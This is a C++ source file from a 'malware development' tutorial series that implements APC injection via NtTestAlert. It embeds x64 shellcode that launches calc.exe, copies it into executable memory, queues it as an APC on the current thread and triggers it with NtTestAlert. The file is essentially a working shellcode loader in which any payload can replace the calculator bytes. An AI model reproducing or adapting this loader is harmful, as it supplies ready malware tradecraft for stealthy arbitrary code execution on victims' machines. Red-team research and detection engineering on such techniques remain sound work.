/*
https://sid4hack.medium.com/malware-development-part-12-apc-injection-via-nttestalert-8beb70834dff
Malware Development Part 12: APC Injection Via NtTestAlert

*/

#include <windows.h>
#include <iostream>
#include <vector>
#include <memory>

// Custom exception for error handling
class InjectionException : public std::exception {
private:
    std::string message;
public:
    InjectionException(const std::string& msg) : message(msg) {}
    const char* what() const noexcept override { return message.c_str(); }
};

// Function type definitions
using NtTestAlertFunc = NTSTATUS(NTAPI*)();

class PayloadInjector {
private:
    // Shellcode payload - spawns calc.exe 
    std::vector<unsigned char> payload = {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    };

    LPVOID payloadMemory;
    HANDLE currentProcess;
    HANDLE currentThread;
    NtTestAlertFunc NtTestAlert;

    void resolveAPIs() {
        HMODULE hNtdll = GetModuleHandleA("ntdll");
        if (!hNtdll) {
            throw InjectionException("Failed to get handle to ntdll.dll");
        }

        NtTestAlert = reinterpret_cast<NtTestAlertFunc>(
            GetProcAddress(hNtdll, "NtTestAlert")
        );
        if (!NtTestAlert) {
            throw InjectionException("Failed to resolve NtTestAlert function");
        }
    }

    void allocateMemory() {
        payloadMemory = VirtualAlloc(
            nullptr,
            payload.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!payloadMemory) {
            throw InjectionException("Failed to allocate memory for payload");
        }
    }

    void writePayload() {
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(
            GetCurrentProcess(),
            payloadMemory,
            payload.data(),
            payload.size(),
            &bytesWritten
        ) || bytesWritten != payload.size()) {
            throw InjectionException("Failed to write payload to memory");
        }
    }

    void queueAPC() {
        PTHREAD_START_ROUTINE apcRoutine = reinterpret_cast<PTHREAD_START_ROUTINE>(payloadMemory);
        if (!QueueUserAPC(
            reinterpret_cast<PAPCFUNC>(apcRoutine),
            GetCurrentThread(),
            0
        )) {
            throw InjectionException("Failed to queue APC");
        }
    }

public:
    PayloadInjector() {
        currentProcess = GetCurrentProcess();
        currentThread = GetCurrentThread();
    }

    void inject() {
        try {
            resolveAPIs();
            allocateMemory();
            writePayload();
            queueAPC();
            
            // Execute APC
            NTSTATUS status = NtTestAlert();
            if (status != 0) {
                throw InjectionException("NtTestAlert failed");
            }
        } catch (const InjectionException& e) {
            std::cerr << "Injection failed: " << e.what() << std::endl;
            cleanup();
            throw;
        }
    }

    void cleanup() {
        if (payloadMemory) {
            VirtualFree(payloadMemory, 0, MEM_RELEASE);
            payloadMemory = nullptr;
        }
    }

    ~PayloadInjector() {
        cleanup();
    }
};

int main() {
    try {
        std::unique_ptr<PayloadInjector> injector = std::make_unique<PayloadInjector>();
        injector->inject();
        std::cout << "Injection successful" << std::endl;
        return EXIT_SUCCESS;
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return EXIT_FAILURE;
    }
}